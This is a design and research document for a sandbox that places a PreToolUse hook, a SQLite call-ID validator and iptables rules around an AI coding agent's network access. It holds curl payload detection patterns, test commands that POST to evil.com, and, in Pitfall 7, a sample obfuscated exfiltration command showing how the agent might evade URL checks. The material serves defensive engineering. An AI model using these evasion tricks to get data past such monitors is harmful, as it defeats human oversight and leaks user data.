# Phase 2: Call Validation - Research

**Researched:** 2026-04-08
**Domain:** PreToolUse hook protocol, Python HTTP/SQLite validator, iptables cross-container enforcement
**Confidence:** HIGH (hook protocol verified against current docs), MEDIUM (iptables architecture has design options)

## Summary

Phase 2 replaces the Phase 1 stub hook (exit 0) and stub validator (accept-all) with functioning security gates. The hook script intercepts Bash/WebFetch/WebSearch tool calls, extracts target domains, checks them against the whitelist, blocks outbound payloads to non-whitelisted domains, and registers call-IDs with the validator for whitelisted calls. The validator stores call-IDs in SQLite and manages iptables rules to enforce network-level blocking.

The most significant architectural challenge is **iptables cross-namespace enforcement**. The validator container has NET_ADMIN capability but manages its own network namespace by default -- not the claude container's. To enforce iptables rules on the claude container's traffic, the architecture must either (a) share network namespaces between claude and validator using `network_mode: service:claude`, or (b) use nsenter from the validator to enter claude's network namespace (requiring PID visibility and SYS_ADMIN capability), or (c) rethink the enforcement model entirely. Option (a) -- shared network namespace -- is the cleanest Docker-native approach and is recommended.

The Claude Code hook protocol has been verified against the current official documentation at code.claude.com. The PreToolUse hook receives JSON on stdin with `tool_name`, `tool_input`, and other fields. It can block calls either via exit code 2 (stderr becomes error message) or via JSON output with `permissionDecision: "deny"` (exit code 0 required). The JSON approach is recommended for production hooks because it provides structured error messages.

**Primary recommendation:** Use shared network namespace (`network_mode: service:claude` on validator) so iptables rules in the validator directly control claude's network traffic. Use JSON `permissionDecision` output (not exit code 2) for hook blocking. Use SQLite WAL mode with per-thread connections for the validator.

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions
- **D-01:** Hook communicates with Claude Code via JSON on stdout. Exit 0 = allow (with optional JSON), exit 2 = block (JSON with `{"error": "reason"}`). This matches the Claude Code PreToolUse hook protocol.
- **D-02:** Hook reads tool call payload from stdin as JSON, extracts tool name and arguments.
- **D-03:** Extract URLs/domains from tool call payloads using regex-based parsing. For Bash tool calls, parse curl/wget commands for target URLs. For WebFetch/WebSearch, extract the URL directly from the tool arguments.
- **D-04:** If a domain cannot be extracted from a Bash command (ambiguous or obfuscated), block the call. Fail-closed is the security default.
- **D-05:** Domain matching includes subdomains -- `api.github.com` matches a whitelist entry for `github.com`.
- **D-06:** For Bash tool calls, detect outbound payloads by checking for HTTP method flags (`-X POST`, `-X PUT`, `-X PATCH`, `-X DELETE`), data flags (`-d`, `--data`, `-F`, `--form`, `--upload-file`), and pipe-to-curl patterns.
- **D-07:** WebFetch tool calls: check the method field if present; default to GET if absent.
- **D-08:** Read-only GET requests to non-whitelisted domains are allowed without call-ID registration (per CALL-04). They still go through the hook but skip the validator registration step.
- **D-09:** Hook generates UUIDs via `uuidgen` and registers with validator at `http://validator:8088/register` including call-ID, target domain, and timestamp.
- **D-10:** Validator stores call-IDs in SQLite with columns: call_id, domain, created_at, expires_at, used (boolean). WAL mode for concurrent access.
- **D-11:** Call-IDs expire after 10 seconds (per project constraint). Background cleanup thread sweeps expired entries.
- **D-12:** Call-IDs are single-use -- once validated, marked as used and cannot be reused.
- **D-13:** Validator manages iptables rules on the claude container's OUTPUT chain. Default policy: DROP all outbound except traffic to proxy (port 8080) and validator (port 8088) on the internal network.
- **D-14:** When a call-ID is registered, validator adds a temporary iptables ACCEPT rule for the target domain/IP. Rule is removed when the call-ID expires or is used.
- **D-15:** iptables rules use domain-to-IP resolution at rule creation time. DNS resolution happens in the validator container (which has network access on the internal network).

### Claude's Discretion
- Exact regex patterns for URL extraction from Bash commands -- researcher should investigate common patterns
- Log format and verbosity for hook decisions -- implementer can decide
- SQLite schema details beyond the core columns listed above

### Deferred Ideas (OUT OF SCOPE)
None -- discussion stayed within phase scope
</user_constraints>

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| CALL-01 | PreToolUse hook intercepts all Bash, WebFetch, and WebSearch tool calls before execution | Hook protocol verified: settings.json matcher `Bash\|WebFetch\|WebSearch` already configured; stdin JSON format documented |
| CALL-02 | Hook extracts target URLs/domains from tool call payloads (curl, wget commands, direct URL arguments) | Regex patterns for curl/wget URL extraction documented; WebFetch/WebSearch have direct URL fields in tool_input |
| CALL-03 | Hook blocks outbound payloads (POST/PUT/PATCH, request bodies, auth headers) to non-whitelisted domains | Detection patterns for HTTP method flags and data flags documented; use JSON permissionDecision deny |
| CALL-04 | Hook allows read-only GET requests to non-whitelisted domains without registration | Hook logic branches on presence of payload indicators; absence means GET/read-only, skip validator registration |
| CALL-05 | Hook generates unique call-ID and registers it with validator before allowing whitelisted calls | uuidgen + curl POST to validator documented; validator /register endpoint already stubbed |
| CALL-06 | Validator stores call-IDs in SQLite with domain, expiry timestamp, and single-use flag | SQLite WAL mode pattern documented; schema and cleanup thread approach defined |
| CALL-07 | iptables rules on claude container block all outbound traffic except to proxy and validator | **Requires shared network namespace architecture** -- documented as critical finding |
</phase_requirements>

## Project Constraints (from CLAUDE.md)

- **Platform**: Must work on Linux (native) and WSL2 -- no macOS Docker Desktop support needed
- **Dependencies**: Docker, Docker Compose, curl, jq, uuidgen must be available on host
- **Security**: Hook scripts, settings, and whitelist must be root-owned and immutable by the Claude process
- **Architecture**: Proxy uses buffered request/response (no streaming) for Phase 1
- **Auth**: OAuth token (via `claude setup-token`) is primary; API key supported as fallback
- **No NFQUEUE**: Validator uses HTTP registration + iptables only (no kernel module dependency)
- **GSD workflow enforcement**: Do not make direct repo edits outside a GSD workflow unless explicitly asked
- **Node.js 22**: Phase 1 used node:22-slim (not 20), python:3.11-slim for validator
- **Non-root user**: Claude container runs as user `claude` (not root)
- **Hooks baked into image**: COPY'd at build time with root ownership, not bind-mounted

## Standard Stack

### Core

| Library/Tool | Version | Purpose | Why Standard |
|-------------|---------|---------|--------------|
| Bash | 5.x | Hook script (pre-tool-use.sh) | Available in all containers; Claude Code hooks are shell scripts; fast startup |
| jq | 1.7+ | JSON parsing in hook | Parses stdin JSON, extracts tool_name/tool_input; reads whitelist.json |
| curl | system | Hook-to-validator HTTP | Registers call-IDs with validator via POST |
| uuidgen | system | Call-ID generation | Generates UUID v4 for each call registration |
| Python | 3.11 (in container) | Validator service | stdlib http.server + sqlite3 + subprocess for iptables |
| SQLite | 3.x (bundled) | Call-ID storage | WAL mode, zero-config, bundled with Python |
| iptables | v1.8.10 (nf_tables backend) | Network enforcement | Available in validator container (already installed in Phase 1 Dockerfile) |

### Supporting

| Tool | Purpose | When to Use |
|------|---------|-------------|
| `grep -E` / `sed` | Regex extraction in hook | Parse URLs from curl/wget commands in Bash tool_input |
| `socket.getaddrinfo()` | DNS resolution in validator | Resolve domain to IP before creating iptables rule |
| `threading.Timer` / `threading.Thread` | Background cleanup | Sweep expired call-IDs and remove stale iptables rules |

### Alternatives Considered

| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| Exit code 2 for blocking | JSON `permissionDecision: "deny"` | JSON is more structured, provides reason to Claude, allows combining with additionalContext. **Use JSON approach.** |
| grep/sed for URL parsing | Python helper called from bash | Would add complexity; grep/sed are sufficient for the defined curl/wget patterns |
| threading for cleanup | asyncio | http.server is synchronous; mixing asyncio would add complexity for no benefit |

## Architecture Patterns

### CRITICAL: Shared Network Namespace for iptables Enforcement

**Problem:** The validator container has NET_ADMIN capability but by default manages its own network namespace. Running `iptables` inside the validator only affects the validator's own traffic -- not the claude container's traffic. This is a fundamental Docker networking constraint: each container has its own network namespace with its own iptables rules.

**Solution:** Use Docker Compose `network_mode: service:claude` on the validator so it shares the claude container's network namespace. This means:
- Validator and claude share the same network interfaces, IP addresses, and iptables rules
- `iptables` commands in the validator directly control claude's outbound traffic
- Validator listens on port 8088 within claude's network namespace (accessible via localhost from claude)
- Validator is no longer separately addressable by container name on the Docker network

**Implications for docker-compose.yml:**
```yaml
services:
  claude:
    # ... existing config ...
    networks:
      - claude-internal
    cap_drop:
      - ALL

  validator:
    build: ./validator
    container_name: claude-validator
    network_mode: service:claude    # Share claude's network namespace
    cap_add:
      - NET_ADMIN                   # iptables access to shared namespace
    depends_on:
      - claude                      # claude must start first (provides network)
    volumes:
      - ./config/whitelist.json:/etc/claude-secure/whitelist.json:ro
      - validator-db:/data
    # NO networks: key -- network_mode: service: is mutually exclusive with networks
```

**Impact on hook:**
- Hook calls validator at `http://localhost:8088/register` (not `http://validator:8088/register`) since they share the network namespace
- Or hook calls `http://127.0.0.1:8088/register` -- same effect

**Impact on DNS resolution in validator:**
- Validator shares claude's DNS config (`dns: 127.0.0.1` which blocks external DNS)
- Validator needs to resolve target domains to IPs for iptables rules
- Solution: Validator resolves via the Docker internal DNS at 127.0.0.11 directly, OR resolves against the proxy container's IP (which can reach external DNS)
- Alternative: For domains in the whitelist, pre-resolve IPs at startup or use the proxy container IP for DNS forwarding

**Alternative Approaches Rejected:**

| Approach | Why Rejected |
|----------|-------------|
| nsenter from validator into claude's namespace | Requires SYS_ADMIN + PID namespace sharing + /proc access; complex and fragile |
| Docker socket mount in validator | Massive security hole; validator could control any container |
| Host network mode on validator | Defeats network isolation; validator would see host network |
| iptables on host (DOCKER-USER chain) | Requires host access; doesn't work for per-call-ID rules; can't be managed from inside container |

### Recommended Project Structure

```
claude-secure/
├── docker-compose.yml              # Updated: validator gets network_mode: service:claude
├── claude/
│   ├── Dockerfile                  # Unchanged from Phase 1
│   ├── settings.json               # Unchanged (matcher already configured)
│   └── hooks/
│       └── pre-tool-use.sh         # REPLACE: full validation logic
├── validator/
│   ├── Dockerfile                  # Minor updates (ensure dns tools if needed)
│   └── validator.py                # REPLACE: full SQLite + iptables logic
├── config/
│   └── whitelist.json              # Unchanged
└── tests/
    ├── test-phase1.sh              # Existing
    └── test-phase2.sh              # NEW: call validation tests
```

### Pattern 1: Hook Decision Flow

**What:** The hook reads stdin JSON, determines tool type, extracts domain, checks whitelist, decides allow/block, optionally registers call-ID.

**Decision tree:**
```
Tool call arrives (stdin JSON)
├── Tool is NOT Bash/WebFetch/WebSearch → allow (should not happen due to matcher)
├── Extract domain from tool_input
│   ├── Cannot extract domain → BLOCK (fail-closed, D-04)
│   ├── Domain extracted
│   │   ├── Is outbound payload (POST/PUT/data flags)?
│   │   │   ├── YES: Domain in whitelist allowed_domains?
│   │   │   │   ├── YES → register call-ID with validator → ALLOW
│   │   │   │   └── NO → BLOCK ("payload to non-whitelisted domain")
│   │   │   └── NO (read-only GET):
│   │   │       ├── Domain in whitelist allowed_domains OR readonly_domains? → ALLOW (no registration)
│   │   │       └── Domain NOT in any list → ALLOW (no registration, per CALL-04/D-08)
```

**Note on CALL-04:** Read-only GET requests to ANY domain (even non-whitelisted) are allowed without registration. The whitelist only gates outbound payloads.

### Pattern 2: URL Extraction from Bash Commands

**What:** Extract target URL/domain from curl and wget commands in Bash tool_input.command.

**Regex patterns for curl:**
```bash
# Extract URL from curl command
# Handles: curl URL, curl -X GET URL, curl -H "header" URL, curl "URL"
# curl's URL is typically the first non-flag argument or follows certain flags

# Pattern 1: URL appears as bare argument (most common)
echo "$COMMAND" | grep -oP 'https?://[^\s"'\''()<>]+' | head -1

# Pattern 2: Also catch single-quoted URLs
echo "$COMMAND" | grep -oP "(https?://[^\"' \t]+)" | head -1
```

**Regex patterns for detecting outbound payload indicators (D-06):**
```bash
# Check for HTTP method flags indicating non-GET
echo "$COMMAND" | grep -qE '\-X\s+(POST|PUT|PATCH|DELETE)' && IS_PAYLOAD=true

# Check for data flags
echo "$COMMAND" | grep -qE '\-(d|F)\s|--data\b|--data-raw\b|--data-binary\b|--data-urlencode\b|--form\b|--upload-file\b' && IS_PAYLOAD=true

# Check for pipe-to-curl (data coming from stdin)
echo "$COMMAND" | grep -qE '\|\s*curl\b' && IS_PAYLOAD=true
```

**Domain extraction from URL:**
```bash
# Extract domain from URL
DOMAIN=$(echo "$URL" | sed -E 's|https?://([^/:]+).*|\1|')
```

**WebFetch tool_input format:**
```json
{"url": "https://example.com/page", "prompt": "extract info"}
```
Domain extraction: `jq -r '.tool_input.url' | sed -E 's|https?://([^/:]+).*|\1|'`

**WebSearch tool_input format:**
```json
{"query": "search terms"}
```
WebSearch does not target a specific domain -- it is a search query. Per the architecture, WebSearch calls are informational reads and should be allowed without registration (consistent with CALL-04 read-only logic).

### Pattern 3: Subdomain Matching (D-05)

**What:** `api.github.com` should match whitelist entry `github.com`.

```bash
# Check if DOMAIN matches or is subdomain of WHITELIST_DOMAIN
domain_matches() {
  local domain="$1"
  local whitelist_entry="$2"
  # Exact match
  [ "$domain" = "$whitelist_entry" ] && return 0
  # Subdomain match: domain ends with .whitelist_entry
  [[ "$domain" == *".$whitelist_entry" ]] && return 0
  return 1
}
```

### Pattern 4: Validator SQLite Schema

```sql
CREATE TABLE IF NOT EXISTS calls (
    call_id TEXT PRIMARY KEY,
    domain TEXT NOT NULL,
    ip_address TEXT,
    created_at TEXT NOT NULL DEFAULT (datetime('now')),
    expires_at TEXT NOT NULL,
    used INTEGER NOT NULL DEFAULT 0
);

CREATE INDEX IF NOT EXISTS idx_expires ON calls(expires_at);
CREATE INDEX IF NOT EXISTS idx_used ON calls(used);
```

### Pattern 5: iptables Rule Management

**Default rules (set at validator startup):**
```bash
# Flush existing rules
iptables -F OUTPUT

# Allow loopback (localhost -- needed for validator communication)
iptables -A OUTPUT -o lo -j ACCEPT

# Allow established connections (responses to incoming requests)
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow traffic to proxy container IP on port 8080
# (proxy IP must be resolved at startup)
iptables -A OUTPUT -d $PROXY_IP -p tcp --dport 8080 -j ACCEPT

# Default: DROP everything else
iptables -P OUTPUT DROP
```

**Per-call temporary rule:**
```bash
# When call-ID registered for domain resolved to IP
iptables -I OUTPUT 4 -d $TARGET_IP -p tcp -j ACCEPT --comment "call-id:$CALL_ID"

# After call-ID used or expired, remove:
iptables -D OUTPUT -d $TARGET_IP -p tcp -j ACCEPT --comment "call-id:$CALL_ID"
```

**Note:** The `--comment` match extension requires the `xt_comment` module. This should be available in the container since iptables is installed. The comment allows correlating rules with call-IDs for cleanup.

### Anti-Patterns to Avoid

- **Parsing JSON with grep/sed in hook:** Use `jq` for all JSON parsing. Regex on JSON is fragile and error-prone.
- **Blocking on validator failure with silent fail:** If curl to validator fails, the hook MUST block the call (fail-closed). Never silently allow.
- **Using iptables rule numbers for deletion:** Rule numbers shift as rules are added/removed. Use `-D` with the full rule specification or `--comment` matching.
- **Resolving DNS in the hook (claude container):** Claude container has blocked DNS (`dns: 127.0.0.1`). All DNS resolution for iptables rules must happen in the validator.
- **Shared SQLite connection across threads:** Python sqlite3 connections are not thread-safe by default. Use per-thread connections or `check_same_thread=False` with a lock.

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| UUID generation | Custom random string | `uuidgen` (uuid-runtime package) | Cryptographically sound UUID v4; already installed in claude container |
| JSON parsing in bash | grep/sed/awk on JSON | `jq` | Handles escaping, nesting, types correctly |
| HTTP server in Python | Raw socket handling | `http.server.HTTPServer` | Handles HTTP protocol details, headers, content-length |
| SQLite concurrent access | File locking | SQLite WAL mode | Kernel-level locking, readers don't block writers |
| iptables comment matching | Manual rule tracking | `iptables --comment` + `-m comment` | Built-in; enables reliable rule deletion by call-ID |

## Common Pitfalls

### Pitfall 1: iptables in Wrong Network Namespace

**What goes wrong:** Validator runs `iptables -A OUTPUT -j DROP` but it only affects the validator's own traffic, not the claude container's traffic.
**Why it happens:** Each Docker container has its own network namespace with its own iptables rules. NET_ADMIN on the validator grants control over the validator's namespace only.
**How to avoid:** Use `network_mode: service:claude` on the validator so both containers share the same network namespace. Then iptables commands in the validator affect claude's traffic.
**Warning signs:** Claude container can still make arbitrary outbound connections despite iptables rules being set in the validator.

### Pitfall 2: Validator DNS Resolution Blocked by Shared Namespace

**What goes wrong:** When validator shares claude's network namespace (via `network_mode: service:claude`), it also inherits claude's `dns: 127.0.0.1` setting, so `socket.getaddrinfo("github.com", 443)` fails.
**Why it happens:** DNS configuration is per-network-namespace. Sharing the namespace means sharing DNS config.
**How to avoid:** Either (a) use Python's `socket.getaddrinfo` pointing to Docker's embedded DNS at 127.0.0.11 directly, (b) pre-resolve whitelisted domains at startup before the OUTPUT DROP rule takes effect, or (c) resolve via the proxy container's IP (which has external DNS access). Option (a) is simplest -- Docker's embedded DNS at 127.0.0.11 can still resolve Docker service names; for external domains, the validator can temporarily allow DNS traffic to resolve, then re-block.
**Warning signs:** Validator logs show "Name resolution failed" for whitelisted domains.

### Pitfall 3: Hook stdin Consumed Before Processing

**What goes wrong:** If the hook script reads stdin with `cat` into a variable but also pipes commands that try to read stdin, the data is gone.
**Why it happens:** stdin is a single-read stream. The Phase 1 stub already does `INPUT=$(cat)` which is correct -- capture once, use many times.
**How to avoid:** Always capture stdin into a variable at the top of the script: `INPUT=$(cat)`. Then pipe from the variable: `echo "$INPUT" | jq ...`
**Warning signs:** `jq` returns null or empty when parsing tool_input.

### Pitfall 4: Race Condition Between Call-ID Registration and iptables Rule

**What goes wrong:** Hook registers a call-ID, Claude Code executes the tool call, but the iptables ACCEPT rule hasn't been added yet, so the outbound connection is DROPped.
**Why it happens:** The hook returns before the validator finishes adding the iptables rule. The tool call starts immediately.
**How to avoid:** The hook must wait for the validator's response before returning. The validator's `/register` endpoint must add the iptables rule synchronously and only return 200 after the rule is active.
**Warning signs:** Intermittent "connection refused" or timeout errors on whitelisted calls.

### Pitfall 5: iptables Rule Accumulation

**What goes wrong:** If cleanup fails or is delayed, hundreds of iptables rules accumulate, degrading performance.
**Why it happens:** Each call-ID adds a rule; expired rules must be actively removed.
**How to avoid:** Background cleanup thread runs every 5 seconds, removing rules for expired/used call-IDs. Also, limit total active rules and reject new registrations if limit exceeded.
**Warning signs:** `iptables -L OUTPUT -n` shows hundreds of rules; network latency increases.

### Pitfall 6: Claude Code Hook Output Format Mismatch

**What goes wrong:** Hook outputs `{"error": "reason"}` for blocking but Claude Code ignores it or doesn't show it to the LLM.
**Why it happens:** D-01 mentions exit 2 with `{"error": "reason"}`, but the verified Claude Code protocol uses either (a) exit 2 with stderr message, or (b) exit 0 with JSON `permissionDecision: "deny"`.
**How to avoid:** Use the verified JSON format:
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "deny",
    "permissionDecisionReason": "Domain not in whitelist: evil.com"
  }
}
```
Exit 0, output this JSON on stdout. The `permissionDecisionReason` is shown to Claude.
**Warning signs:** Claude retries blocked calls or doesn't acknowledge the block reason.

### Pitfall 7: curl Command Obfuscation

**What goes wrong:** Claude constructs a Bash command that evades URL detection: `DOMAIN=evil.com; curl https://$DOMAIN/exfil`, or uses variables, backticks, eval, base64 decode, etc.
**Why it happens:** Regex-based URL extraction cannot parse arbitrary shell expansions.
**How to avoid:** D-04 specifies fail-closed: if a URL cannot be extracted, block. Additionally, check for shell metacharacters that could indicate obfuscation (`$`, backticks, `eval`, `base64`). If found in a curl/wget context, block.
**Warning signs:** Exfiltration succeeds via variable-substituted URLs.

## Code Examples

### Hook Script Structure (pre-tool-use.sh)

```bash
#!/bin/bash
# pre-tool-use.sh -- PreToolUse hook for call validation
# Source: Claude Code hooks protocol (https://code.claude.com/docs/en/hooks)
set -euo pipefail

# Capture stdin immediately (single-read stream)
INPUT=$(cat)

TOOL_NAME=$(echo "$INPUT" | jq -r '.tool_name')
WHITELIST="/etc/claude-secure/whitelist.json"
VALIDATOR_URL="http://127.0.0.1:8088"
LOG_FILE="/var/log/claude-secure/hook.log"

log() { echo "[$(date -Iseconds)] $*" >> "$LOG_FILE" 2>/dev/null || true; }

# Helper: output deny decision
deny() {
  local reason="$1"
  log "DENY: $reason"
  jq -n --arg reason "$reason" '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: $reason
    }
  }'
  exit 0
}

# Helper: output allow decision
allow() {
  log "ALLOW: $1"
  exit 0  # bare exit 0 = allow
}

# Extract domain based on tool type
extract_domain() {
  case "$TOOL_NAME" in
    Bash)
      local cmd
      cmd=$(echo "$INPUT" | jq -r '.tool_input.command // empty')
      # Extract URL from curl/wget commands
      local url
      url=$(echo "$cmd" | grep -oP 'https?://[^\s"'\''()<>]+' | head -1)
      if [ -n "$url" ]; then
        echo "$url" | sed -E 's|https?://([^/:]+).*|\1|'
      fi
      ;;
    WebFetch)
      echo "$INPUT" | jq -r '.tool_input.url // empty' | sed -E 's|https?://([^/:]+).*|\1|'
      ;;
    WebSearch)
      echo ""  # WebSearch has no target domain
      ;;
  esac
}

# Check if command has outbound payload indicators
has_payload() {
  local cmd
  cmd=$(echo "$INPUT" | jq -r '.tool_input.command // empty')
  echo "$cmd" | grep -qE '\-X\s+(POST|PUT|PATCH|DELETE)' && return 0
  echo "$cmd" | grep -qE '(\s|^)-(d|F)\s|--data\b|--data-raw\b|--form\b|--upload-file\b' && return 0
  echo "$cmd" | grep -qE '\|\s*curl\b' && return 0
  return 1
}

# Check domain against whitelist (with subdomain matching)
domain_in_list() {
  local domain="$1"
  local list_path="$2"  # jq path like '.secrets[].allowed_domains[]' or '.readonly_domains[]'
  local entries
  entries=$(jq -r "$list_path" "$WHITELIST" 2>/dev/null)
  while IFS= read -r entry; do
    [ "$domain" = "$entry" ] && return 0
    [[ "$domain" == *".$entry" ]] && return 0
  done <<< "$entries"
  return 1
}

# ... main logic using these helpers ...
```

### Validator Registration Endpoint

```python
# Source: Python stdlib http.server + sqlite3
import json
import sqlite3
import socket
import subprocess
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timedelta

DB_PATH = "/data/validator.db"
CALL_TTL_SECONDS = 10

def get_db():
    """Per-thread database connection with WAL mode."""
    conn = sqlite3.connect(DB_PATH, timeout=10)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=5000")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS calls (
            call_id TEXT PRIMARY KEY,
            domain TEXT NOT NULL,
            ip_address TEXT,
            created_at TEXT NOT NULL DEFAULT (datetime('now')),
            expires_at TEXT NOT NULL,
            used INTEGER NOT NULL DEFAULT 0
        )
    """)
    conn.execute("CREATE INDEX IF NOT EXISTS idx_expires ON calls(expires_at)")
    conn.commit()
    conn.close()

def resolve_domain(domain):
    """Resolve domain to IP address."""
    try:
        result = socket.getaddrinfo(domain, 443, socket.AF_INET)
        return result[0][4][0] if result else None
    except socket.gaierror:
        return None

def add_iptables_rule(ip, call_id):
    """Add temporary ACCEPT rule for target IP."""
    subprocess.run([
        "iptables", "-I", "OUTPUT", "4",
        "-d", ip, "-p", "tcp", "-j", "ACCEPT",
        "-m", "comment", "--comment", f"call-id:{call_id}"
    ], check=True)

def remove_iptables_rule(ip, call_id):
    """Remove ACCEPT rule for target IP."""
    subprocess.run([
        "iptables", "-D", "OUTPUT",
        "-d", ip, "-p", "tcp", "-j", "ACCEPT",
        "-m", "comment", "--comment", f"call-id:{call_id}"
    ], check=False)  # Don't fail if rule already gone
```

### iptables Default Rules (Validator Startup)

```python
def setup_default_iptables():
    """Set default OUTPUT chain rules. Must run at validator startup."""
    # Flush OUTPUT chain
    subprocess.run(["iptables", "-F", "OUTPUT"], check=True)

    # Allow loopback (localhost communication with hook)
    subprocess.run(["iptables", "-A", "OUTPUT", "-o", "lo", "-j", "ACCEPT"], check=True)

    # Allow established/related connections (responses)
    subprocess.run([
        "iptables", "-A", "OUTPUT",
        "-m", "state", "--state", "ESTABLISHED,RELATED",
        "-j", "ACCEPT"
    ], check=True)

    # Allow traffic to proxy (resolve proxy IP via Docker DNS)
    proxy_ip = resolve_domain("proxy")
    if proxy_ip:
        subprocess.run([
            "iptables", "-A", "OUTPUT",
            "-d", proxy_ip, "-p", "tcp", "--dport", "8080",
            "-j", "ACCEPT"
        ], check=True)

    # Default policy: DROP
    subprocess.run(["iptables", "-P", "OUTPUT", "DROP"], check=True)
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| Exit code 2 for hook blocking | JSON `permissionDecision` on exit 0 | Claude Code current docs | Structured reasons shown to LLM; allows combining with additionalContext |
| Separate network namespaces | `network_mode: service:` for sidecar | Docker Compose v2 | Enables iptables control from sidecar container |
| Python sqlite3 default journal | WAL mode (`PRAGMA journal_mode=WAL`) | SQLite 3.7+ | Concurrent reads/writes without blocking |

**Deprecated/outdated:**
- CONTEXT.md D-01 mentions exit 2 with `{"error": "reason"}` JSON. Verified protocol: exit 2 uses **stderr** for the message (not JSON on stdout). Recommend using JSON `permissionDecision: "deny"` with exit 0 instead.
- Docker Compose v1 `depends_on` without conditions. Use `depends_on: {service: {condition: service_started}}` syntax.

## Open Questions

1. **Proxy container IP resolution from shared namespace**
   - What we know: Validator shares claude's network namespace (dns: 127.0.0.1). Docker's embedded DNS at 127.0.0.11 resolves container names on the internal network.
   - What's unclear: Whether `socket.getaddrinfo("proxy", 8080)` works from the shared namespace, since the claude container can resolve "proxy" and "validator" container names despite dns: 127.0.0.1 (Docker's embedded DNS is separate from configured dns servers).
   - Recommendation: Test in implementation. If 127.0.0.11 doesn't work from the shared namespace, fall back to hardcoding the proxy container's IP from `docker network inspect` at startup, or resolve at build time.

2. **iptables `--comment` module availability in container**
   - What we know: The xt_comment kernel module is needed. It's part of netfilter extras.
   - What's unclear: Whether it's available in the python:3.11-slim container with iptables installed.
   - Recommendation: Test `iptables -A OUTPUT -j ACCEPT -m comment --comment "test"` during implementation. If unavailable, fall back to tracking rules by (IP, call_id) tuple in Python and using `-d IP -p tcp -j ACCEPT` without comments for rule matching.

3. **WebSearch tool_input format**
   - What we know: WebSearch receives a query, not a URL.
   - What's unclear: The exact `tool_input` fields for WebSearch (e.g., `{query: "..."}` or `{search_query: "..."}`).
   - Recommendation: Log the actual tool_input during testing. WebSearch is a read-only search -- allow without registration per CALL-04 logic.

4. **ESTABLISHED,RELATED iptables rule scope**
   - What we know: The ESTABLISHED,RELATED rule allows return traffic for established connections.
   - What's unclear: Whether this rule could be exploited -- e.g., if Claude establishes a connection before the DROP policy, would it persist?
   - Recommendation: The DROP policy applies to new outbound connections. ESTABLISHED only allows packets on already-established sessions. Since the hook must register a call-ID before the tool executes, and the tool establishes the connection after the iptables rule is added, this is safe. The rule is removed when the call-ID expires, closing the window.

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| Docker Engine | Container runtime | Yes | 29.3.1 | -- |
| Docker Compose v2 | Orchestration | Yes | v5.1.1 | -- |
| iptables (in container) | Network enforcement | Yes | v1.8.10 (nf_tables) | -- |
| curl (in claude container) | Hook-to-validator HTTP | Yes | installed via apt | -- |
| jq (in claude container) | JSON parsing in hook | Yes | installed via apt | -- |
| uuidgen (in claude container) | Call-ID generation | Yes | uuid-runtime installed | -- |
| Python 3.11 (in validator) | Validator service | Yes | python:3.11-slim base | -- |
| SQLite 3.x (bundled with Python) | Call-ID storage | Yes | bundled | -- |

**Missing dependencies with no fallback:** None.

**Missing dependencies with fallback:** None.

## Validation Architecture

### Test Framework

| Property | Value |
|----------|-------|
| Framework | Bash + docker compose exec + curl (same pattern as Phase 1) |
| Config file | None needed -- shell scripts |
| Quick run command | `bash tests/test-phase2.sh` |
| Full suite command | `bash tests/test-phase1.sh && bash tests/test-phase2.sh` |

### Phase Requirements -> Test Map

| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|-------------|
| CALL-01 | Hook intercepts Bash/WebFetch/WebSearch calls | integration | Exec hook script with mock stdin JSON, verify it processes and returns | Wave 0 |
| CALL-02 | Hook extracts domains from curl/wget/WebFetch payloads | integration | Feed curl command via mock stdin, verify domain is correctly extracted | Wave 0 |
| CALL-03 | Hook blocks POST to non-whitelisted domain | integration | Feed `curl -X POST https://evil.com` via mock stdin, verify deny response | Wave 0 |
| CALL-04 | Hook allows GET to non-whitelisted domain without registration | integration | Feed `curl https://random.com` via mock stdin, verify allow without validator call | Wave 0 |
| CALL-05 | Hook generates call-ID and registers with validator | integration | Feed whitelisted curl command, verify validator received registration | Wave 0 |
| CALL-06 | Validator stores call-IDs in SQLite with expiry and single-use | integration | Register call-ID, validate it, try to validate again (should fail) | Wave 0 |
| CALL-07 | iptables DROP on claude container without valid call-ID | integration | Attempt `curl` from claude container without hook, verify connection dropped | Wave 0 |

### Sampling Rate

- **Per task commit:** `bash tests/test-phase2.sh`
- **Per wave merge:** `bash tests/test-phase1.sh && bash tests/test-phase2.sh`
- **Phase gate:** All Phase 1 + Phase 2 tests green before `/gsd:verify-work`

### Wave 0 Gaps

- [ ] `tests/test-phase2.sh` -- covers CALL-01 through CALL-07
- [ ] iptables `--comment` module test -- verify availability in container before relying on it
- [ ] DNS resolution test from shared namespace -- verify validator can resolve Docker service names

## Sources

### Primary (HIGH confidence)
- [Claude Code hooks reference](https://code.claude.com/docs/en/hooks) -- PreToolUse stdin format, exit codes, hookSpecificOutput schema, permissionDecision values. Verified 2026-04-08.
- [Docker Compose networking](https://docs.docker.com/compose/how-tos/networking/) -- `network_mode: service:` syntax for shared network namespaces
- [Docker iptables docs](https://docs.docker.com/engine/network/firewall-iptables/) -- Docker's iptables management, DOCKER-USER chain
- [SQLite WAL documentation](https://www.sqlite.org/wal.html) -- WAL mode concurrent access semantics
- Phase 1 artifacts (docker-compose.yml, Dockerfiles, stubs) -- verified working infrastructure

### Secondary (MEDIUM confidence)
- [Sharing Network Namespaces in Docker](https://blog.mikesir87.io/2019/03/sharing-network-namespaces-in-docker/) -- network_mode: service: practical implications
- [Docker network namespaces](https://oneuptime.com/blog/post/2026-02-08-how-to-understand-docker-network-namespaces/view) -- nsenter and namespace management
